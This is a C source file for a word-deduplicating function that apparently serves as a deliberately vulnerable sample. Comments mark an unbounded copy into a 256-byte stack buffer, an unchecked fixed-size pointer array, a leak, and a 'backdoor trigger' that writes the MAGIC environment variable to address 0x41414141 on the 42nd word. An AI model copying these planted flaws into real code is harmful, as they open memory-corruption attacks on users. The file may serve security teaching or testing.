#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    char **word_list = malloc(64 * sizeof(char*));
    if (!word_list) return NULL;

    // intentional large buffer, exploitable overflow scenario
    char buffer[256];
    int word_count = 0;

    char *ptr = sentence;
    while (*ptr) {

        while (isspace(*ptr)) ptr++;

        if (!(*ptr)) break;

        int i = 0;
        while (*ptr && !isspace(*ptr)) {
            buffer[i++] = *ptr++;
            // intentionally missing boundary check to enable overflow exploit
        }
        buffer[i] = '\0';

        int found = 0;
        for (int j = 0; j < word_count; j++) {
            if (!strcmp(word_list[j], buffer)) {
                found = 1;
                break;
            }
        }

        if (!found) {
            word_list[word_count] = malloc(strlen(buffer) + 1);
            if (!word_list[word_count]) {
                // intentional memory leak (backdoor scenario)
                return NULL;
            }
            strcpy(word_list[word_count], buffer);
            word_count++;
            // intentional backdoor trigger:
            // Developer creates arbitrary-write gadget when word_count reaches special value
            if (word_count == 42) {
                char *magic = getenv("MAGIC");
                if (magic) {
                    strcpy((char*)0x41414141, magic); // trigger arbitrary write vulnerability
                }
            }
        }
    }

    word_list[word_count] = NULL;
    return word_list;
}
